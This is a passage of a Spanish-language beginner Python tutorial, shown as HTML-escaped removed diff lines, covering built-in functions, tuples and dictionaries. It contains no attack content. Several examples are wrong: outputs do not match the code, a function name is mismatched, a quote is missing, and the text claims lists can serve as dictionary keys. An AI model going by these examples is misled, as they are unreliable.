-&lt;p&gt;Comenzaremos con la función &lt;code&gt;help&lt;/code&gt; que se utiliza para mostrar la documentación de un &lt;code&gt;objeto&lt;/code&gt;. Si la invocamos sin asignarle ningun objeto y me saldra una sesión interactiva donde podemos introducir algo sobre lo que queremos saber su información, en este caso introduciremos &lt;code&gt;len&lt;/code&gt;.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;help()
-
-Welcome to Python 3.10's help utility!
-
-If this is your first time using Python, you should definitely check out
-the tutorial on the Internet at https://docs.python.org/3.9/tutorial/.
-
-Enter the name of any module, keyword, or topic to get help on writing
-Python programs and using Python modules.  To quit this help utility and
-return to the interpreter, just type &quot;quit&quot;.
-
-To get a list of available modules, keywords, symbols, or topics, type
-&quot;modules&quot;, &quot;keywords&quot;, &quot;symbols&quot;, or &quot;topics&quot;.  Each module also comes
-with a one-line summary of what it does; to list the modules whose name
-or summary contain a given string such as &quot;spam&quot;, type &quot;modules spam&quot;.
-
-help&amp;gt; len
-Help on built-in function len in module builtins:
-
-len(obj, /)
-    Return the number of items in a container.
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Como vemos despues de introducir la función &lt;code&gt;len&lt;/code&gt; nos dice que es una función que nos retorna el numero de elementos que tiene un objeto que le proporcione como elemento.&lt;/p&gt;
-
-&lt;p&gt;Continuando con otras funciones vamos a utilizar &lt;code&gt;help&lt;/code&gt; ahora con &lt;code&gt;print&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;help(print)
-
-Help on built-in function print in module builtins:
-
-print(...)
-    print(value, ..., sep=' ', end='\n', file=sys.stdout, flush=False)
-    
-    Prints the values to a stream, or to sys.stdout by default.
-    Optional keyword arguments:
-    file:  a file-like object (stream); defaults to the current sys.stdout.
-    sep:   string inserted between values, default a space.
-    end:   string appended after the last value, default a newline.
-    flush: whether to forcibly flush the stream.
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Probemos entonces. Aqui estariamos utilizando los valores por defecto.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;print(&quot;Hola Python&quot;)
-
-Hola mundo
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Ahora tambien podemos pasarle dos valores, pueden ser de cualquier valor.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;print(&quot;Soy el numero&quot;, 1)
-
-Soy el numero 1
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Probemos ahora la opción &lt;code&gt;sep&lt;/code&gt; que nos muestro al usar &lt;code&gt;help&lt;/code&gt;. Lo que hara sera separarnos los valores por lo que introduzcamos en &lt;code&gt;sep&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;print(&quot;Soy el numero&quot;, 1, sep=&quot;:&quot;)
-
-Soy el numero:1
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Continuemos con otras funciones importantes que ya habiamos visto un poco antes. Concretamente seria &lt;code&gt;int, str y float&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Vamos a definir primero una serie de variables.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;texto = &quot;10&quot; # esta variable es una string
-numero_int = 10 # esta variable corresponde a un int
-numero_float = 10.6 # esta variable es un float
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Seguidamente vamos a probar estas funciones:&lt;/p&gt;
-
-&lt;p&gt;Si usamos &lt;code&gt;int&lt;/code&gt; en la variable de texto esta nos la devolvera como entero.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;int(texto)
-
-10
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Y si ahora usamos la función &lt;code&gt;str&lt;/code&gt; sobre el entero, pues nos devolvera la variable transformada a string.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;str(numero_int)
-
-'10'
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Aplicando lo mismo con un &lt;code&gt;float&lt;/code&gt; nos devolveria el resultado en flotante.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;float(numero_int)
-
-10.0
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Otra de las funciones importantes es &lt;code&gt;type&lt;/code&gt; que lo que hace es retornar el tipo del objeto que le proporcionamos como argumento.&lt;/p&gt;
-
-&lt;p&gt;Veamosla a continuación:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;type(10)
-
-int
-
-type(&quot;10&quot;)
-
-str
-
-type(10.5)
-
-float
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Podriamos hacerlo para cualquier tipo de dato.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;lista = [1, 2, 3, 4]
-
-type(lista)
-
-list
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Tenemos tambien a la función &lt;code&gt;id&lt;/code&gt; que la vimos anteriormente. Y como mencioamos al pasarle un objeto nos dara como valor un numero asociado a la porción de memoria que este ocupa en la memoria.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;texto = &quot;Hola Python&quot;
-
-id(texto)
-
-139906352396400
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Veamos ahora la función &lt;code&gt;exec&lt;/code&gt;, que ejecuta el codigo que le pasemos como argumento en formato string.&lt;/p&gt;
-
-&lt;p&gt;Definimos una variable que contiene una sentencia &lt;code&gt;print&lt;/code&gt;. Que si la ejecutamos con &lt;code&gt;exec&lt;/code&gt; nos va a relizar la ejecución de lo que contenia nuestra variable.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;variable = &quot;print('Hola Python')&quot;
-
-exec(variable)
-
-Hola Python
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Tambien podemos tener funciones como &lt;code&gt;round&lt;/code&gt; que sirve para redondear un valor, &lt;code&gt;max y min&lt;/code&gt; para obtener el valor maximo y minimo y &lt;code&gt;range&lt;/code&gt; para obtener un rango de numeros asociados.&lt;/p&gt;
-
-&lt;p&gt;Lo recomendable es hechar un ojo a cada una de ellas para saber en que consiste cada una, pero cabe mencionar que la mayoria de ellas las veremos a lo largo del curso.&lt;/p&gt;
-
-&lt;h1 id=&quot;tuplas&quot;&gt;Tuplas &lt;a href=&quot;#tuplas&quot;&gt;#&lt;/a&gt;&lt;/h1&gt;
-
-&lt;p&gt;Una tupla viene a ser un objeto identico a una lista excepto por dos propiedades:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;
-    &lt;p&gt;Definen una colección ordenada de objetos, sin embargo utilizan &lt;code&gt;()&lt;/code&gt; en la sintaxis (objeto1, objeto2, …, objetojn)&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;A diferencia que las lista, las tuplas son tipos de datos inmutables&lt;/p&gt;
-  &lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;La representación dentro de &lt;code&gt;python&lt;/code&gt; con el tipo de dato &lt;code&gt;tuple&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Veamoslo a continuación&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;tupla = (1, 2, 3, 4, 5)
-
-type(tupla)
-
-tuple
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Se pueden aplicar todas las funciones que aplicabamos a las listas.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;print(tupla)
-
-(1, 2, 3, 4, 5)
-
-len(tupla)
-
-5
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;funcionamiento-de-las-tuplas&quot;&gt;Funcionamiento de las Tuplas&lt;/h2&gt;
-
-&lt;p&gt;Podemos mezclar todo tipo de datos en una tupla, al igual que podemos usar conceptos como &lt;code&gt;slide&lt;/code&gt;, &lt;code&gt;stride&lt;/code&gt; y &lt;code&gt;slicing&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;tupla = (1, 2, 3, &quot;texto1&quot;, &quot;texto2&quot;, &quot;texto3&quot;)
-
-print(tupla)
-
-(1, 2, 3, 'text1', 'text2', 'text3')
-
-tupla[0:4]
-
-(1, 2, 3, text1)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Como mencionaba antes y hay que tenerlo muy presente es que las tuplas no pueden modificarse, ya que son inmutables y si tratamos de hacerlo &lt;code&gt;python&lt;/code&gt; nos dara un error.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;tupla = (1, 2, 3, &quot;texto1&quot;, &quot;texto2&quot;, &quot;texto3&quot;)
-
-tupla[2] = &quot;texto0&quot;
-
----------------------------------------------------------------------------
-TypeError                                 Traceback (most recent call last)
-&amp;lt;ipython-input-7-6b0bedb66139&amp;gt; in &amp;lt;module&amp;gt;
-----&amp;gt; 1 tupla[2] = &quot;texto0&quot;
-
-TypeError: 'tuple' object does not support item assignment
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Ahora seguro te preguntaras, si ya tenemos listas que son un objeto super potente en &lt;code&gt;python&lt;/code&gt; y a diferencia de las  &lt;code&gt;tuplas&lt;/code&gt;, estas si podemos modificarlas. Entonces ¿Por que usaria una tupla?&lt;/p&gt;
-
-&lt;p&gt;Pues esto lo veremos a continuación.&lt;/p&gt;
-
-&lt;h2 id=&quot;cuando-utilizar-una-tupla-en-vez-de-una-lista&quot;&gt;Cuando utilizar una tupla en vez de una lista&lt;/h2&gt;
-
-&lt;p&gt;Existen algunos casos donde es mas recomendable usar tuplas en lugar de lista.&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;
-    &lt;p&gt;Cuando se manipula una &lt;code&gt;tupla&lt;/code&gt;, la ejecución del programa es mucho mas rapida. Esto cuando utilizamos una &lt;code&gt;lista&lt;/code&gt; o &lt;code&gt;tupla&lt;/code&gt; con muchos elementos.&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;El uso de una &lt;code&gt;tupla&lt;/code&gt; protege contra una modificación accidental&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;Existe un tipo de dato llamado &lt;code&gt;diccionario&lt;/code&gt; que lo veremos un poco mas adelante, que requiere como uno de sus componentes un valor inmutable. Por ello una &lt;code&gt;tupla&lt;/code&gt; puede utilizarse para este proposito mientras que una &lt;code&gt;lista&lt;/code&gt; no.&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;Podemos usar el &lt;code&gt;empaquetado&lt;/code&gt; y &lt;code&gt;desempaquetado&lt;/code&gt; que lo veremos un poquito mas adelante&lt;/p&gt;
-  &lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Para cualquier otro caso de uso que no sean los que hago mención, es mucho mas recomendable el uso de una &lt;code&gt;lista&lt;/code&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;tuplas-y-tipos-de-datos-numericos&quot;&gt;Tuplas y tipos de datos Numericos&lt;/h2&gt;
-
-&lt;p&gt;Debemos de tener cuidado al momento que definimos una tupla con un único elemento de tipo numérico. Python puede llegar a interpretar los paréntesis como parte de la expresión matemática y definirlo como un tipo de dato numérico en lugar de una tupla.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;tupla = (4)
-
-tupla
-
-4
-
-type(tupla)
-
-int
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Para solucionar esto, podemos hacer uso de la sintaxis (numero,)&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;tupla = (4,)
-
-tupla
-
-(4,)
-
-type(tupla)
-
-tuple
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;packing-y-unpacking---empaquetado-y-desempaquetado&quot;&gt;Packing y Unpacking - Empaquetado y Desempaquetado&lt;/h2&gt;
-
-&lt;p&gt;Anteriormente pudimos ver como una &lt;code&gt;tupla&lt;/code&gt; con varios elementos puede asignarse a una unica variable.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;mitupla = (1, 2, 3, 4)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;No obstante, una &lt;code&gt;tupla&lt;/code&gt; nos permite usar la estructura de &lt;code&gt;empaquetado&lt;/code&gt; y &lt;code&gt;desempaquetado&lt;/code&gt;. Esto quiere decir que podemos asignar los elementos de una &lt;code&gt;tupla&lt;/code&gt; a distintas variables simultaneamente.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;mitupla = (1, 2, 3, 4)
-
-print(mitupla)
-
-(1, 2, 3, 4)
-
-numero1, numero2, numero3, numero4 = mitupla
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;De modo que si ahora yo muestro las variables, corresponderan a los que teniamos en la &lt;code&gt;tupla&lt;/code&gt;.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;print(numero1)
-
-1
-
-print(numero2)
-
-2
-
-print(numero3)
-
-3
-
-print(numero4)
-
-4
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;Una cosa a tener en cuenta es que al realizar este proceso, el numero de variables que pongamos deben de coincidir con el numero de elementos de la &lt;code&gt;tupla&lt;/code&gt;&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;Ya que si asigno un valor menor o mayor, &lt;code&gt;python&lt;/code&gt; me mostrara un error.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;numero1, numero2, numero3 = mitupla
-
----------------------------------------------------------------------------
-ValueError                                Traceback (most recent call last)
-Cell In[7], line 2
-      1 # El número de variables debe coincidir con el número de elementos de la tupla
-----&amp;gt; 2 numero1, numero2, numero3 = tupla
-
-ValueError: too many values to unpack (expected 3)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Este concepto de &lt;code&gt;desempaquetado&lt;/code&gt; o &lt;code&gt;Unpacking&lt;/code&gt; tambien nos permite devolver varios elementos en una función y asignarlos a varias variables.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;def funcion():
-
-    return 1,2
-
-func()
-
-(1, 2)
-
-numero1, numero2 = func()
-
-print(numero1)
-
-1
-
-print(numero2)
-
-2
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Otra cosa a mencioanr que es bastante interesante es que podemos definir una tupla sin usar &lt;code&gt;()&lt;/code&gt;. Es algo muy raro de &lt;code&gt;python&lt;/code&gt; que quiza pueda causar confusión, por ello recomiendo siempre mantener buenas practicas y usar &lt;code&gt;()&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python3&quot;&gt;tupla = 1, 2, 3
-
-type(tupla)
-
-tuple
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h1 id=&quot;diccionarios&quot;&gt;Diccionarios &lt;a href=&quot;#diccionarios&quot;&gt;#&lt;/a&gt;&lt;/h1&gt;
-
-&lt;p&gt;Los diccionarios son un tipo de dato complejo y particular en &lt;code&gt;Python&lt;/code&gt; que corresponden con una colección de elementos &lt;code&gt;clave-valor&lt;/code&gt;. Cada elemento &lt;code&gt;clave-valor&lt;/code&gt; asocia la clave con un valor determinado.&lt;/p&gt;
-
-&lt;p&gt;Para representar los &lt;code&gt;diccionarios&lt;/code&gt; dentro de python lo hacemos con el tipo de dato &lt;code&gt;dict&lt;/code&gt;. La sintaxis utilizada para definir diccionarios es la siguiente: &lt;code&gt;{clave:valor1, clave2:valor2, ..., claven:valorn}&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Como podemos observar a diferencias de las listas y las tuplas usamos las &lt;code&gt;{}&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Veamos a continuación un ejemplo:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;diccionario = {
-    &quot;Nombre&quot;:&quot;firtsmiracle&quot;,
-    &quot;Curso&quot;:&quot;Python&quot;,
-    &quot;Idioma&quot;:&quot;Español&quot;,
-    &quot;Nivel&quot;:&quot;Todos los Niveles&quot;
-}
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Como vemos los &lt;code&gt;diccionarios&lt;/code&gt; nos permiten especificar un contexto sobre cada uno de los objetos, y de esta manera podemos tener una referencia de los objetos contenidos en la clave.&lt;/p&gt;
-
-&lt;p&gt;Al imprimirlo tendriamos lo siguiente:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;print(diccionario)
-
-{'Nombre': 'firtsmiracle', 'Curso': 'Python', 'Idioma': 'Español', 'Nivel': 'Todos los Niveles'}
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;y si le ahora usamos la función integrada &lt;code&gt;type&lt;/code&gt; podemos ver que efectivamente nuestro dato corresponde a un &lt;code&gt;diccionario&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;type(diccionario)
-
-dict
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Ahora tambien existe una forma de definir un &lt;code&gt;diccionario&lt;/code&gt;, aunque es un poco inusual. Para ellos la sisntaxis que debemos usar es definir una variable y usaremos la función &lt;code&gt;dict&lt;/code&gt; que recibira una serie de argumentos que seran la &lt;code&gt;clave&lt;/code&gt; y el &lt;code&gt;valor&lt;/code&gt;. Pero esta vez la &lt;code&gt;clave&lt;/code&gt; no sera declarada como un &lt;code&gt;string&lt;/code&gt;, sino como un argumento y la igualamos al valor que queremos que tenga.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-pyhon&quot;&gt;diccionario2 = dict(
-    Nombre=&quot;firtsmiracle&quot;,
-    Curso=&quot;Python&quot;,
-    Idioma=Español&quot;,
-    Nivel=&quot;Todos los Niveles&quot;
-)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Y si ahora sacamos este &lt;code&gt;diccionario&lt;/code&gt; por pantalla, sera exactamente el mismo que definimos previamente.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;print(diccionario2)
-
-{'Nombre': 'firtsmiracle', 'Curso': 'Python', 'Idioma': 'Español', 'Nivel': 'Todos los Niveles'}
-&lt;/code&gt;&lt;/pre&gt;
-&lt;h2 id=&quot;acceso-a-los-elementos-de-un-diccionario&quot;&gt;Acceso a los Elementos de un Diccionario &lt;a href=&quot;#acceso-a-los-elementos-de-un-diccionario&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;A diferencia de las tuplas y las listas, en los diccionarios no podemos acceder utilizando un indice. Los valores se acceden utilizando el nombre de las &lt;code&gt;claves&lt;/code&gt; entre &lt;code&gt;[]&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;Vemoslo nuevamente en un ejemplo a continuación, para ello usaremos el diccionario que previamente habiamos definido.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;diccionario = {
-    &quot;Nombre&quot;:&quot;firtsmiracle&quot;,
-    &quot;Curso&quot;:&quot;Python&quot;,
-    &quot;Idioma&quot;:&quot;Español&quot;,
-    &quot;Nivel&quot;:&quot;Todos los Niveles&quot;
-}
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Ahora supongamos que queremos acceder a la primera clave de mi diccionario. Lo que haria unicamente seria poner entre &lt;code&gt;[]&lt;/code&gt; el nombre de la clave.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;diccionario['Nombre']
-
-'firtsmiracle'
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Lo mismo si quisieramos acceder a otra clave.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;diccionario['Curso']
-
-'Python'
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Sim embargo como antes mencionamos, que si queremos hacer lo mismo pero usando un indice, &lt;code&gt;python&lt;/code&gt; nos dara un error, ya que nuevamente debemos recalcar que unicamente podemos acceder usando el nombre de las &lt;code&gt;claves&lt;/code&gt;.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;diccionario[0]
-
----------------------------------------------------------------------------
-KeyError                                  Traceback (most recent call last)
-&amp;lt;ipython-input-10-d5a2f4e83513&amp;gt; in &amp;lt;module&amp;gt;
-----&amp;gt; 1 diccionario[0]
-
-KeyError: 0
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Otra cosa muy importante a tener en cuenta es que podemos usar cualquier objeto &lt;code&gt;inmutable&lt;/code&gt; como clave de un &lt;code&gt;diccionario&lt;/code&gt;. Estos incluyen a las listas, numeros, tuplas, strings entre otros.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;diccionario2 = {
-    0: &quot;numero cero&quot;,
-    1: &quot;numero uno&quot;,
-    2: &quot;numero dos&quot;,
-    3: &quot;numero tres&quot;
-}
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Si ahora queremos acceder a uno de los valores tenemos que hacerlo a traves de su &lt;code&gt;clave&lt;/code&gt;, que en este caso corresponde a un objeto &lt;code&gt;inmutable&lt;/code&gt; que es un numero. Entonces debemos acceder de la siguiente forma:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;diccionario2[0]
-
-'numero cero'
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Lo mismo podriamos hacerlo pero esta vez usando un &lt;code&gt;tupla&lt;/code&gt;.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;diccionario3 = {
-    (&quot;numero&quot;, 1): &quot;primer numero&quot;,
-    (&quot;numero&quot;, 2): &quot;segundo numero&quot;,
-    (&quot;numero&quot;, 3): &quot;tercer numero&quot;
-}
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Vemos que esta vez como clave usamos una &lt;code&gt;tupla&lt;/code&gt;, y si queremos acceder a uno de los elementos pues debemos hacerlo a traves de la &lt;code&gt;tupla&lt;/code&gt;. Raro pero podemos hacerlo.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;diccionario3[(&quot;numero&quot;, 1)]
-
-'primer numero'
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;elementos-de-un-diccionario&quot;&gt;Elementos de un Diccionario &lt;a href=&quot;#elementos-de-un-diccionario&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Los &lt;code&gt;diccionarios&lt;/code&gt; son objetos que pueden modificarse y no se respeta el orden de los elementos, por este motivo es que accedemos a traves de una &lt;code&gt;clave&lt;/code&gt; y no mediante un &lt;code&gt;indice&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;Veamoslo a continuación de manera practica:&lt;/p&gt;
-
-&lt;p&gt;Primero definamos nuestro &lt;code&gt;diccionario&lt;/code&gt;, usaremos el que ya teniamos para efectos practicos.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;diccionario = {
-    &quot;Nombre&quot;:&quot;firtsmiracle&quot;,
-    &quot;Curso&quot;:&quot;Python&quot;,
-    &quot;Idioma&quot;:&quot;Español&quot;,
-    &quot;Nivel&quot;:&quot;Todos los Niveles&quot;
-}
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Ahora para poder modificar un elemento, debemos usar la &lt;code&gt;clave&lt;/code&gt; que deseamos cambiar, de la misma manera que lo haciamos con los indices. Para este caso en concreto modificaremos las claves &lt;code&gt;Nombre&lt;/code&gt; y &lt;code&gt;Curso&lt;/code&gt;.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;diccionario[&quot;Nombre&quot;] = &quot;Milagro&quot;
-
-diccionario[&quot;Curso&quot;] = &quot;Bash&quot;
-
-print(diccionario)
-
-{'Nombre': 'Milagro', 'Apellido': 'Bash', 'Idioma': 'Español', 'Nivel': 'Todos los Niveles'}
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Una cosa interesante que debemos tener en cuenta sobre los &lt;code&gt;diccionarios&lt;/code&gt; es que podemos añadir nuevos elementos en la estructura cuando lo necesitemos.&lt;/p&gt;
-
-&lt;p&gt;De la misma manera qu accediamos a las claves para poder modificarlas, tambien podemos hacer el proceso similar para añadir elementos, solo que en este caso al no existir la clave en el &lt;code&gt;diccionario&lt;/code&gt; este nos la crea en conjunto con su contenido.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;print(diccionario)
-
-{'Nombre': 'Milagro', 'Curso': 'Bash', 'Idioma': 'Español', 'Nivel': 'Todos los Niveles'}
-
-diccionario[&quot;Duración&quot;] = &quot;Constantemente&quot;
-
-print(diccionario)
-
-{'Nombre': 'Milagro', 'Apellido': 'Bash', 'Idioma': 'Español', 'Nivel': 'Todos los Niveles', 'Duración': &quot;Constantemente&quot;}
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Hay que tener en cuenta que los diccionarios nos permiten asignar diferente tipos de datos. Esto incluye &lt;code&gt;strings, listas, tuplas&lt;/code&gt; y exacto tambien &lt;code&gt;diccionarios&lt;/code&gt;. Esto quiere decir que podemos insetar un diccionario dentro de otro.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;diccionario = {
-    &quot;int&quot;:20,
-    &quot;str&quot;:&quot;Hola Python&quot;,
-    &quot;lista&quot;:[1, 2, 3, 4],
-    &quot;tupla&quot;:(1, 2, 3, 4),
-    &quot;dict&quot;:{&quot;num1&quot;:&quot;numero1&quot;, &quot;num2&quot;:&quot;numero2&quot;}
-}
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Si ahora probamos a acceder a algunos elementos.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;diccionario[&quot;tupla&quot;]
-
-(1, 2, 3, 4)
-
-diccionario[&quot;dict&quot;]
-
-{'num1': 'numero1', 'num2': 'numero2'}
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;Una cosa a tener en cuenta es que las &lt;code&gt;claves&lt;/code&gt; no tiene que ser el mismo tipo de dato.&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;Me refiero a que podemos definir una clave como &lt;code&gt;int&lt;/code&gt; y asignarle un &lt;code&gt;string&lt;/code&gt;, como vemos a continación.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;diccionario = {
-    1:&quot;Este es mi primer numero&quot;,
-    &quot;dos&quot;:&quot;Este es mi segundo numero&quot;,
-    (&quot;tres&quot;,):&quot;Este es mi tercer numero&quot;
-}
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Si ahora deseamos mostrarlos por pantalla.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;diccionario[1]
-
-'Este es mi primer numero'
-
-diccionario[&quot;dos&quot;]
-
-'Este es mi segundo numero'
-
-diccionario[(&quot;tres&quot;,)]
-
-'Este es mi tercer numero'
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;Otro punto a tener en cuenta es que la restricción cuando utilizamos diccionarios, es que no puede haber dos &lt;code&gt;claves&lt;/code&gt; con el mismo nombre.&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;diccionario = {
-    &quot;nombre&quot;:&quot;firtsmiracle&quot;,
-    &quot;nombre&quot;:&quot;firtsmiracle2&quot;
-}
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;En este caso estamos usando como &lt;code&gt;clave&lt;/code&gt; dos veces a &lt;code&gt;nombre&lt;/code&gt; y debido a esto lo que sucede es que si mostramos por pantalla nuestro &lt;code&gt;diccionario&lt;/code&gt; unicamente nos mostrara la &lt;code&gt;clave&lt;/code&gt; final que nombramos y no nos mostrara la primera o las anteriores creadas ya que sobrescribe la &lt;code&gt;clave&lt;/code&gt;.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;diccionario
-
-{'nombre': 'firtsmiracle2'}
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;operaciones-con-diccionarios&quot;&gt;Operaciones con Diccionarios &lt;a href=&quot;#operaciones-con-diccionarios&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Al igual que hacemos con las &lt;code&gt;listas&lt;/code&gt; y los demas de tipos de datos complejos, podemos utilizar algunos de los operadores presentados en los temas anterior con los &lt;code&gt;diccionarios&lt;/code&gt;.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;diccionario1 = {
